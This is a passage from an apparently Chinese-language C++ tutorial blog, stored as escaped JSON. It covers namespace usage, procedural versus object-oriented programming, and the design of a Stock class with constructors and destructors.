func1\\n&quot;;&#125;void func2() &#123; int x; std::cin &gt;&gt; x; std::cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; std::endl;&#125; 在每个需要访问 std 的函数内部使用 using 声明或 using namespace std;: 这将 using 的作用域限制在函数内部，减少了命名冲突的风险。 123456789101112131415161718192021222324#include &lt;iostream&gt;void func1() &#123; using namespace std; // using 指令只在 func1 内部有效 cout &lt;&lt; &quot;Hello from func1\\n&quot;; &#125;void func2() &#123; using std::cin; // using 声明只引入 cin using std::cout; using std::endl; int x; cin &gt;&gt; x; cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; endl;&#125;int main() &#123; // 在 main 中也需要访问 std using namespace std; func1(); func2(); cout &lt;&lt; &quot;Back in main.&quot; &lt;&lt; endl; return 0;&#125; 在所有函数定义之前（通常是在所有 #include 之后）放置一个 using namespace std; 指令: 这使得文件中的所有后续代码都可以直接使用 std 中的名称，无需 std:: 前缀。这种方式最简单，但在大型项目中或编写头文件时不推荐，因为它可能引入全局命名冲突。 对于学习和小型项目，这通常是可接受的。 用法与示例 (全局 using 指令): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt;// 将 using 指令放在所有函数之外using namespace std; // 函数原型void print_sqrt(double val);double get_input();int main() &#123; double number = get_input(); // 直接使用 get_input print_sqrt(number); // 直接使用 print_sqrt cout &lt;&lt; &quot;Program finished.&quot; &lt;&lt; endl; // 直接使用 cout 和 endl return 0;&#125;// 函数定义void print_sqrt(double val) &#123; if (val &lt; 0) &#123; cout &lt;&lt; &quot;Cannot calculate square root of a negative number.&quot; &lt;&lt; endl; &#125; else &#123; double root = sqrt(val); // 直接使用 sqrt (来自 cmath, 已在 std 中) cout &lt;&lt; &quot;The square root of &quot; &lt;&lt; val &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; endl; &#125;&#125;double get_input() &#123; double input_val; cout &lt;&lt; &quot;Enter a number: &quot;; // 直接使用 cout cin &gt;&gt; input_val; // 直接使用 cin return input_val;&#125; 选择哪种方式取决于项目的规模和个人/团队的编码规范。对于初学者编写的简单多函数程序，将 using namespace std; 放在 #include 之后是一种常见的简化方法。 2.5 总结本章引导我们迈出了学习C++的第一步，涵盖了编写、编译和理解一个基本C++程序所需的 foundational concepts。 我们从C++程序的核心——main()函数开始，它是程序的入口点。了解了如何使用注释（// 和 /* */）来提高代码的可读性。接着，我们接触了C++预处理器，特别是 #include 指令，它用于包含头文件（如 &lt;iostream&gt;），这些头文件提供了函数和对象的声明。我们区分了标准库头文件（用 &lt;&gt;）和用户自定义头文件（用 &quot;&quot;）。 名称空间的概念被引入，特别是 std 名称空间，它包含了C++标准库的大部分内容。我们学习了访问 std 中元素的三种方式：使用 std:: 前缀、using 声明和 using 编译指令，并讨论了它们的适用场景和潜在风险。 我们重点学习了如何使用 iostream 库中的 cout 对象和插入运算符 &lt;&lt; 来显示各种类型的数据（字符串、整数、浮点数等），以及如何使用 endl 或 \\n 进行换行。代码格式化的重要性也被强调，以保证代码清晰、易于维护。 随后，我们学习了C++的基本语句类型。声明语句用于创建变量，指定其类型和名称，并可以选择在声明时进行初始化。赋值语句使用 = 运算符将值存储到变量中。我们还看到了 cout 如何智能地处理不同数据类型，以及如何通过链式调用 &lt;&lt; 来拼接输出。 输入操作通过 cin 对象和提取运算符 &gt;&gt; 实现，允许程序从用户那里读取数据并存储到变量中。 最后，我们初步探讨了函数。我们学习了如何调用库函数（如 &lt;cmath&gt; 中的 sqrt()）并使用它们的返回值。我们了解了函数的不同变体（有/无参数，有/无返回值）。更重要的是，我们学习了如何定义自己的函数，包括编写函数原型（声明）和函数定义（实现），以及如何通过函数调用来执行它们。我们还讨论了如何在包含多个函数的程序中管理 std 名称空间的使用。 通过本章的学习，我们已经能够编写简单的C++程序，实现基本的输入、处理和输出功能，并对C++程序的结构和一些核心概念有了初步的认识。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 10 对象和类","slug":"Cpp_tutorial_Chapter_10","date":"2025-04-26T12:03:35.399Z","updated":"2025-04-26T12:02:31.684Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_10/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_10/","excerpt":"","text":"10.1 过程性编程和面向对象编程在深入学习C++的类之前，了解两种主要的编程范式（Programming Paradigms）——过程性编程和面向对象编程——之间的区别是很有帮助的。C++ 语言同时支持这两种范式，但其强大的面向对象特性是其核心优势之一。 过程性编程 (Procedural Programming)过程性编程是最早期的编程范式之一，像C语言就是典型的过程性语言。它的核心思想是将程序看作是一系列要执行的过程或函数。 关注点： 主要关注点在于算法和执行步骤。程序被分解为一系列的函数调用。 数据处理： 数据通常是独立于函数存在的（例如全局变量），或者作为参数在函数之间传递。数据和操作数据的函数是分离的。 组织方式： 程序通过函数的层次结构来组织。一个主函数调用其他函数，这些函数又可能调用更底层的函数。 示例语言： C, Pascal, Fortran。 过程性编程的思维方式： “程序需要执行哪些步骤？需要哪些函数来实现这些步骤？” 例子（概念性）：假设要管理一个银行账户。在过程性方法中，你可能会有： 一个数据结构（比如 struct）来存储账户信息（账号、余额）。 一系列函数来操作这个数据结构：deposit(account, amount), withdraw(account, amount), check_balance(account)。 12345678910111213141516171819202122232425262728293031// C 语言示例 (过程性)struct BankAccount &#123; int accountNumber; double balance;&#125;;void deposit(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0) &#123; acc-&gt;balance += amount; &#125;&#125;void withdraw(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0 &amp;&amp; acc-&gt;balance &gt;= amount) &#123; acc-&gt;balance -= amount; &#125; else &#123; // 处理错误 &#125;&#125;double check_balance(struct BankAccount* acc) &#123; return acc-&gt;balance;&#125;int main() &#123; struct BankAccount myAccount = &#123;12345, 1000.0&#125;; deposit(&amp;myAccount, 500.0); withdraw(&amp;myAccount, 200.0); // ... return 0;&#125; 在这种模式下，数据（myAccount）和操作（deposit, withdraw）是分开定义的。 面向对象编程 (Object-Oriented Programming - OOP)面向对象编程（OOP）是一种不同的思考方式。它将程序看作是由相互交互的对象 (Objects) 组成的。 关注点： 主要关注点在于数据以及与数据相关的操作。程序的核心是对象。 对象： 对象是现实世界实体的抽象，它封装 (Encapsulates) 了数据（属性/状态）和可以对这些数据执行的操作（方法/行为）。 组织方式： 程序通过创建对象并让这些对象相互发送消息（调用方法）来组织。 核心概念： 封装 (Encapsulation): 将数据和操作数据的函数捆绑在一起（形成类），并对外部隐藏对象的内部实现细节（数据隐藏）。 继承 (Inheritance): 允许创建一个新类（派生类），该类继承现有类（基类）的属性和方法，从而实现代码重用和层次结构。 多态 (Polymorphism): 允许不同类的对象对相同的消息（方法调用）做出不同的响应。这通常通过虚函数实现。 抽象 (Abstraction): 关注对象的本质特征，忽略不重要的细节。类就是一种抽象。 示例语言： C++, Java, C#, Python, Smalltalk。 面向对象编程的思维方式： “程序涉及哪些‘事物’（对象）？每个‘事物’有哪些特征（数据）？它可以做什么（方法）？这些‘事物’之间如何交互？” 例子（概念性）：对于银行账户，OOP方法会创建一个 BankAccount 类： 数据成员（属性）： accountNumber, balance (通常设为私有 private，以实现数据隐藏)。 成员函数（方法）： deposit(amount), withdraw(amount), check_balance() (这些函数直接操作对象内部的数据)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// C++ 示例 (面向对象)class BankAccount &#123;private: // 数据隐藏 int accountNumber; double balance;public: // 公共接口 // 构造函数 (用于创建对象) BankAccount(int accNum, double initialBalance) &#123; accountNumber = accNum; balance = (initialBalance &gt;= 0) ? initialBalance : 0.0; &#125; void deposit(double amount) &#123; if (amount &gt; 0) &#123; balance += amount; &#125; &#125; void withdraw(double amount) &#123; if (amount &gt; 0 &amp;&amp; balance &gt;= amount) &#123; balance -= amount; &#125; else &#123; // 处理错误 &#125; &#125; double check_balance() const &#123; // const 表示此方法不修改对象状态 return balance; &#125; int getAccountNumber() const &#123; return accountNumber; &#125;&#125;; // 注意类定义末尾的分号int main() &#123; // 创建 BankAccount 对象 BankAccount myAccount(12345, 1000.0); // 通过对象调用方法 myAccount.deposit(500.0); myAccount.withdraw(200.0); std::cout &lt;&lt; &quot;Balance: &quot; &lt;&lt; myAccount.check_balance() &lt;&lt; std::endl; return 0;&#125; 在这里，数据 (accountNumber, balance) 和操作 (deposit, withdraw, check_balance) 被紧密地捆绑在 BankAccount 类中。你通过 myAccount 这个对象来调用它的方法。 总结对比 特性 过程性编程 面向对象编程 (OOP) 核心 函数/过程 对象 (数据 + 方法) 数据 通常与函数分离 封装在对象内部 访问控制 有限 (主要靠作用域) 强 (public, private, protected) 主要优势 简单直接，适合小型或中型项目 模块化、重用性、可维护性、扩展性好 设计方法 自顶向下 (Top-down) 自底向上 (Bottom-up) 或混合 代码重用 主要通过函数库 主要通过继承和组合 适合场景 算法密集型、顺序执行任务 大型复杂系统、模拟、GUI C++ 最初是从 C 语言发展而来的，因此它完全兼容过程性编程。然而，C++ 的真正威力在于其强大的面向对象特性，它允许开发者构建更大型、更复杂、更易于维护和扩展的软件系统。接下来的章节将深入探讨 OOP 的核心——类和对象。 10.2 抽象和类面向对象编程（OOP）的核心思想之一是**抽象 (Abstraction)**。在编程中，抽象意味着关注事物的本质特征和行为，而忽略其不重要的内部细节。我们每天都在使用抽象：当你开车时，你只需要知道如何使用方向盘、油门和刹车（接口），而不需要了解引擎内部复杂的机械原理（实现细节）。 10.2.1 类型是什么在编程语言中，“类型”（Type）定义了一组可能的值以及可以对这些值执行的操作。 内置类型 (Built-in Types): C++ 提供了像 int, float, char, bool 这样的基本类型。我们知道 int 可以存储整数，并且可以对它们执行加、减、乘、除等运算。编译器知道如何表示这些类型的数据以及如何执行这些操作。 用户定义类型 (User-Defined Types - UDT): C++ 允许程序员创建自己的类型来模拟现实世界或特定问题域中的概念。这就是类 (Class) 发挥作用的地方。类是一种将数据（属性）和操作这些数据的函数（方法）捆绑在一起的机制，从而创建新的数据类型。 例如，如果你在编写一个股票交易程序，你可能需要一个表示“股票”的类型。这个类型应该包含哪些数据（如股票名称、持有数量、单价）？可以对它执行哪些操作（如购买、出售、更新价格、显示信息）？类允许你精确地定义这些。 10.2.2 C++中的类类是创建对象的蓝图或模板。它定义了： 数据成员 (Data Members): 对象将存储的数据（也称为属性、状态）。 成员函数 (Member Functions): 可以对对象的数据执行的操作（也称为方法、行为）。 类声明的基本语法: 123456789101112class ClassName &#123;private: // 私有数据成员和成员函数 // 通常将数据成员放在这里，实现数据隐藏public: // 公有数据成员和成员函数 // 这是类的公共接口，外部代码通过它们与对象交互protected: // 保护成员 (将在继承中讨论)&#125;; // 注意末尾的分号 class 关键字: 表明你正在定义一个类。 ClassName: 你为新类型指定的名称（遵循变量命名规则，通常首字母大写）。 访问说明符 (Access Specifiers): private: 私有成员只能被类的内部成员函数访问。这是实现数据隐藏 (Data Hiding) 的关键，保护数据不被外部代码随意修改，是封装的重要体现。默认情况下，类成员是 private 的。 public: 公有成员可以被程序中的任何地方访问（通过类的对象）。它们构成了类的**公共接口 (Public Interface)**。 protected: 与继承相关，现在可以暂时将其视为与 private 类似。 成员: 类定义的花括号 &#123;&#125; 内部声明的变量（数据成员）和函数（成员函数）。 示例：定义一个简单的 Stock 类 假设我们要创建一个表示股票持有的类。 1234567891011121314151617181920// 通常放在头文件 (e.g., stock.h) 中#include &lt;string&gt; // 为了使用 std::stringclass Stock &#123;private: // 数据成员通常是私有的 std::string company; long shares; double share_val; double total_val; // 一个私有辅助函数，只能在类内部调用 void set_tot() &#123; total_val = shares * share_val; &#125;public: // 成员函数通常是公有的，构成接口 // 函数原型 (声明) void acquire(const std::string &amp;co, long n, double pr); // 买入股票 void buy(long num, double price); // 增持股票 void sell(long num, double price); // 卖出股票 void update(double price); // 更新股价 void show() const; // 显示股票信息 (const表明此函数不修改对象)&#125;; // 类定义结束 这个 Stock 类定义了一个新的数据类型。它封装了股票相关的数据 (company, shares, share_val, total_val) 和操作这些数据的函数 (acquire, buy, sell, update, show)。数据成员被设为 private，外部代码不能直接访问它们，只能通过 public 的成员函数来交互。set_tot() 是一个内部辅助函数，也被设为 private。 10.2.3 实现类成员函数类定义通常只包含成员函数的声明（原型）。函数的定义（实现）可以放在类声明的内部（如果函数很简单，可以作为内联函数），或者更常见地，放在类声明的外部（通常在对应的源文件 .cpp 中）。 当在类外部定义成员函数时，你需要使用作用域解析运算符 :: 来指明这个函数属于哪个类。 语法: 123ReturnType ClassName::FunctionName(ParameterList) &#123; // 函数体&#125; 示例：实现 Stock 类的成员函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// 通常放在源文件 (e.g., stock.cpp) 中#include &lt;iostream&gt;#include &quot;stock.h&quot; // 包含类定义的头文件// 使用作用域解析运算符 :: 指明函数属于 Stock 类void Stock::acquire(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot(); // 调用私有成员函数计算总值&#125;void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; // 假设按新价格计算 set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; // 假设按新价格计算 set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;// 注意 const 关键字在函数定义和声明中都要有void Stock::show() const &#123; // 设置输出格式 std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; // 设置精度为2位小数显示总价 std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; // 恢复原始格式 std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125;// 注意：私有成员函数 set_tot() 也可以在类外部定义，// 但因为它很简单，通常会直接在类定义内部实现（如上所示），// 这样它就可能被编译器视为内联函数。// 如果在外部定义：// void Stock::set_tot() &#123;// total_val = shares * share_val;// &#125; const 成员函数:在 show() 函数声明和定义的末尾都有 const 关键字。这表明 show() 是一个常量成员函数，它承诺不会修改调用它的对象的数据成员。这是一个好习惯，可以提高代码的可读性和安全性，并允许对 const 对象调用此函数。 10.2.4 使用类一旦定义了类（蓝图），你就可以创建该类的对象 (Objects) 或**实例 (Instances)**。创建对象就像声明一个基本类型的变量一样。 123456789101112131415161718192021222324252627// 在 main() 函数或其他函数中#include &quot;stock.h&quot; // 需要包含类定义int main() &#123; // 创建两个 Stock 对象 (实例) Stock stock1; Stock stock2; // 使用点号 . (成员访问运算符) 调用对象的公有成员函数 stock1.acquire(&quot;NanoSmart&quot;, 20, 12.50); stock1.show(); // 显示 stock1 的信息 stock2.acquire(&quot;Boffo Objects&quot;, 2, 180.0); stock2.show(); // 显示 stock2 的信息 stock2.buy(5, 190.0); // 增持 stock2 stock2.show(); stock1.sell(10, 15.75); // 卖出部分 stock1 stock1.show(); // 错误！不能直接访问私有成员 // stock1.shares = 50; // 编译错误 // std::cout &lt;&lt; stock1.company; // 编译错误 return 0;&#125; Stock stock1; 创建了一个名为 stock1 的 Stock 类型的对象。 使用成员访问运算符（点号 .）来调用对象的公有成员函数，例如 stock1.acquire(...) 或 stock2.show()。 每个对象都有自己的一套数据成员。stock1 的 shares 和 stock2 的 shares 是相互独立的。 你不能从对象外部直接访问 private 成员，这强制你必须通过类提供的公共接口（public 函数）来与对象交互。 10.2.5 修改实现将类的接口（头文件中的声明）和实现（源文件中的定义）分开的一个主要好处是封装带来的灵活性。 接口 (Interface): 头文件 (stock.h) 定义了如何使用这个类（公共成员函数）。使用类的代码（如 main() 函数）只需要包含头文件。 实现 (Implementation): 源文件 (stock.cpp) 包含了成员函数具体如何工作。 只要类的公共接口保持不变（函数名、参数、返回类型不变），你就可以自由地修改源文件中的实现细节（例如，改进 set_tot 的计算方式，或者改变内部数据的存储方式），而不需要修改或重新编译使用该类的其他代码文件（如包含 main() 的文件）。只需要重新编译实现文件 (stock.cpp) 并重新链接即可。 这大大降低了维护成本，并使得代码库更容易更新和改进。用户只关心“能做什么”（接口），而不必关心“怎么做”（实现）。 10.2.6 小结 抽象是关注本质、忽略细节的编程思想。 类是C++实现抽象和创建用户定义类型的主要机制。 类将数据（成员变量）和操作数据的函数（成员函数）捆绑在一起。 访问说明符（public, private, protected）控制对类成员的访问。 数据隐藏（通常将数据设为 private）是封装的关键，保护数据并隐藏实现细节。 公共接口（public 成员函数）定义了如何与类的对象交互。 成员函数通常在类外部使用作用域解析运算符 :: 来定义。 使用点号 . 访问对象的公有成员。 将接口和实现分离（头文件/源文件）可以提高代码的模块化和可维护性。 10.3 类的构造函数和析构函数在上一节中，我们定义了一个 Stock 类，并通过 acquire() 成员函数来设置其初始状态。然而，C++ 提供了一种更自动化、更专门化的方式来处理对象的初始化和清理工作：构造函数 (Constructor) 和 **析构函数 (Destructor)**。 10.3.1 声明和定义构造函数构造函数是一种特殊的成员函数，它的主要目的是在创建类的对象时初始化该对象的数据成员。 特点与规则: 名称与类名相同: 构造函数的名称必须与它所属的类的名称完全一样。 没有返回类型: 构造函数没有声明返回类型，连 void 也没有。 自动调用: 当创建类的对象时，程序会自动调用相应的构造函数。 可以重载: 一个类可以有多个构造函数，只要它们的参数列表不同（参数个数、类型或顺序不同）。这允许以不同的方式初始化对象。 声明语法 (在类定义内): 12345678class ClassName &#123;public: // 构造函数声明 (无参数) ClassName(); // 构造函数声明 (带参数) ClassName(ParameterList); // ... 其他成员 ...&#125;; 定义语法 (在类外部): 123456789// 无参数构造函数定义ClassName::ClassName() &#123; // 初始化代码&#125;// 带参数构造函数定义ClassName::ClassName(ParameterList) &#123; // 使用参数进行初始化&#125; 示例：为 Stock 类添加构造函数 我们可以为 Stock 类添加构造函数来替代之前的 acquire() 函数的部分功能，确保对象在创建时就被赋予有意义的初始值。 123456789101112131415161718192021// 在 stock.h 的类定义中声明class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // 构造函数声明 (两个版本) Stock(); // 默认构造函数 (无参数) Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // 带参数的构造函数 (使用默认参数) // 不再需要 acquire()，因为构造函数处理了初始设置 // void acquire(const std::string &amp;co, long n, double pr); void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 在 stock.cpp 中定义构造函数#include &lt;iostream&gt;#include &quot;stock.h&quot;// 默认构造函数定义Stock::Stock() &#123; // 默认构造函数 std::cout &lt;&lt; &quot;Default constructor called\\n&quot;; // 只是为了演示 company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;// 带参数的构造函数定义Stock::Stock(const std::string &amp;co, long n, double pr) &#123; std::cout &lt;&lt; &quot;Constructor using &quot; &lt;&lt; co &lt;&lt; &quot; called\\n&quot;; // 只是为了演示 company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// ... buy(), sell(), update(), show() 的定义保持不变 ...// (注意：buy, sell, update 内部的 set_tot() 调用仍然需要)void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.2 使用构造函数当创建对象时，编译器会自动选择匹配的构造函数来执行。 1234567891011121314151617181920212223242526272829303132#include &quot;stock.h&quot; // 包含 Stock 类定义int main() &#123; // 调用带参数的构造函数 Stock(const std::string &amp;co, long n, double pr) Stock stock1(&quot;NanoSmart&quot;, 12, 20.0); // 显式提供所有参数 stock1.show(); // 调用带参数的构造函数，利用了 n 和 pr 的默认值 (n=0, pr=0.0) Stock stock2(&quot;Boffo Objects&quot;); // 等同于 Stock(&quot;Boffo Objects&quot;, 0, 0.0) stock2.show(); // 调用默认构造函数 Stock() Stock stock3; // 注意：这里不能写 stock3() stock3.show(); // 也可以使用 C++11 的列表初始化 Stock stock4 = &#123;&quot;Fleep Enterprises&quot;, 100, 1.25&#125;; // 调用带参数构造函数 stock4.show(); Stock stock5&#123;&quot;Dummy Corp&quot;&#125;; // 调用带参数构造函数 (利用默认值) stock5.show(); Stock stock6&#123;&#125;; // 调用默认构造函数 Stock() stock6.show(); // 动态分配对象时也会调用构造函数 Stock *p_stock = new Stock(&quot;Electroshock Games&quot;, 18, 19.0); p_stock-&gt;show(); delete p_stock; // 稍后会看到 delete 会调用析构函数 return 0;&#125; 输出可能包含 (取决于编译器和优化): 123456789101112131415161718192021Constructor using NanoSmart calledCompany: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Constructor using Boffo Objects calledCompany: Boffo Objects Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Fleep Enterprises calledCompany: Fleep Enterprises Shares: 100 Share Price: $1.250 Total Worth: $125.00Constructor using Dummy Corp calledCompany: Dummy Corp Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Electroshock Games calledCompany: Electroshock Games Shares: 18 Share Price: $19.000 Total Worth: $342.00 10.3.3 默认构造函数默认构造函数 (Default Constructor) 是指不接受任何参数的构造函数。 编译器生成的默认构造函数: 如果你没有为类定义任何构造函数，编译器会自动为你生成一个默认构造函数。这个合成的构造函数什么也不做（对于内置类型成员不会初始化，对于类类型成员会调用其默认构造函数）。 用户定义的默认构造函数: 如果你定义了一个无参数的构造函数（如上面 Stock::Stock()），那么它就是默认构造函数。 重要规则: 如果你为类定义了任何构造函数（即使是带参数的），编译器就不会再自动生成默认构造函数了。如果你还需要一个无参数的构造函数（例如，为了能创建 Stock stock3; 这样的对象），你就必须显式地定义它。 在我们的 Stock 示例中，因为我们定义了 Stock(const std::string &amp;co, ...)，编译器就不会自动生成默认构造函数。因此，我们必须自己提供 Stock::Stock()，否则 Stock stock3; 这样的声明将导致编译错误。 C++11 = default: 如果你定义了其他构造函数，但仍希望编译器为你生成默认的、行为简单的默认构造函数，可以使用 = default。 1234567class Example &#123;public: Example(int v) : value(v) &#123;&#125; // 用户定义的带参构造函数 Example() = default; // 显式要求编译器生成默认构造函数private: int value;&#125;; 10.3.4 析构函数析构函数 (Destructor) 是另一种特殊的成员函数，它的主要目的是在对象生命周期结束时执行清理工作。 用途: 释放对象在生命周期内分配的资源（例如，通过 new 分配的内存）。 执行任何必要的关闭操作（例如，关闭文件、断开网络连接）。 特点与规则: 名称: 析构函数的名称是在类名前加上波浪号 ~（例如 ~Stock）。 没有返回类型: 和构造函数一样，析构函数也没有返回类型，连 void 也没有。 没有参数: 析构函数不能接受任何参数，因此不能被重载。一个类最多只有一个析构函数。 自动调用: 当对象被销毁时，析构函数会自动被调用。这发生在： 对象的作用域结束时（对于自动存储对象，如函数内的局部对象）。 当对指向对象的指针调用 delete 时（对于动态存储对象）。 当包含该对象的对象被销毁时。 声明语法 (在类定义内): 123456class ClassName &#123;public: // ... 构造函数和其他成员 ... // 析构函数声明 ~ClassName();&#125;; 定义语法 (在类外部): 123ClassName::~ClassName() &#123; // 清理代码&#125; 示例：为 Stock 类添加析构函数 对于我们当前的 Stock 类，它并没有在内部使用 new 分配内存，所以析构函数不是严格必需的。但为了演示，我们可以添加一个简单的析构函数。 12345678910// 在 stock.h 的类定义中声明class Stock &#123; // ... private members ...public: // ... constructors ... // ... other public methods ... // 析构函数声明 ~Stock();&#125;; 12345678910111213// 在 stock.cpp 中定义析构函数#include &lt;iostream&gt;#include &quot;stock.h&quot;// ... constructor definitions ...// ... other method definitions ...// 析构函数定义Stock::~Stock() &#123; // 对于这个简单的 Stock 类，没什么需要显式清理的 // 但我们可以加一条打印语句来观察它何时被调用 std::cout &lt;&lt; &quot;Bye, &quot; &lt;&lt; company &lt;&lt; &quot;!\\n&quot;;&#125; 观察析构函数的调用: 123456789101112131415161718192021#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; &#123; // 创建一个内部作用域 std::cout &lt;&lt; &quot;--- Entering inner block ---\\n&quot;; Stock stock1(&quot;Smart Comp&quot;, 50, 5.0); Stock stock2(&quot;Great Gadgets&quot;, 10, 12.0); std::cout &lt;&lt; &quot;--- Exiting inner block ---\\n&quot;; // 当离开这个作用域时，stock2 和 stock1 (按相反顺序创建) 会被销毁 &#125; // stock2 的析构函数先调用，然后是 stock1 的 std::cout &lt;&lt; &quot;--- Creating dynamic stock ---\\n&quot;; Stock *p_stock = new Stock(&quot;Dynamic Duo&quot;, 25, 2.5); p_stock-&gt;show(); std::cout &lt;&lt; &quot;--- Deleting dynamic stock ---\\n&quot;; delete p_stock; // 调用析构函数，然后释放内存 std::cout &lt;&lt; &quot;--- main() is ending ---\\n&quot;; return 0;&#125; 可能的输出: 12345678910111213--- Entering inner block ---Constructor using Smart Comp calledConstructor using Great Gadgets called--- Exiting inner block ---Bye, Great Gadgets!Bye, Smart Comp!--- Creating dynamic stock ---Constructor using Dynamic Duo calledCompany: Dynamic Duo Shares: 25 Share Price: $2.500 Total Worth: $62.50--- Deleting dynamic stock ---Bye, Dynamic Duo!--- main() is ending --- 注意析构函数调用的时机和顺序（对于局部对象，与构造顺序相反）。 10.3.5 改进 Stock 类现在，我们可以整合构造函数和析构函数，得到一个更完善（虽然在这个例子中析构函数作用不大）的 Stock 类。 stock.h (最终版本) 1234567891011121314151617181920212223242526272829// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.h#ifndef STOCK_H_#define STOCK_H_#include &lt;string&gt;class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // 构造函数 Stock(); // 默认构造函数 Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // 析构函数 ~Stock(); // 其他成员函数 void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;;#endif // STOCK_H_ stock.cpp (最终版本) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.cpp#include &lt;iostream&gt;#include &quot;stock.h&quot;// 构造函数定义Stock::Stock() &#123; company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;Stock::Stock(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares can&#x27;t be negative. &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; // 使用 cerr 输出错误 shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// 析构函数定义Stock::~Stock() &#123; // 在这个简单类中，析构函数体可以为空 // std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\\n&quot;; // 可以取消注释来观察&#125;// 其他成员函数定义void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; 